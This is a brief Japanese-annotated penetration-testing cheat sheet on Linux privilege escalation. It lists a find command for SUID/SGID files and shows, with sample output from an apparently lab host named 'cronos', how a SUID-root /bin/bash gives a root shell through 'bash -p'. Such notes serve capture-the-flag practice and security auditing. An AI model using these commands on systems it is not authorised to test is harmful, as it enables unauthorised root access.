## general
#### Search
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
  - SUIDファイルを実行すると、ファイル所有者の権限で実行される
  - SGIDファイルを実行すると、ファイルの属するグループの権限で実行される
## bash
#### Search
- `ls -l /bin/bash`
  - example
    ```
    www-data@cronos:/var/www/laravel$ ls -l /bin/bash
    -rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
    ```
#### Escalation
- `bash -p`
  - exsample
    ```
    www-data@cronos:/var/www/laravel$ bash -p
    bash-4.3# whoami
    root
    ``` 
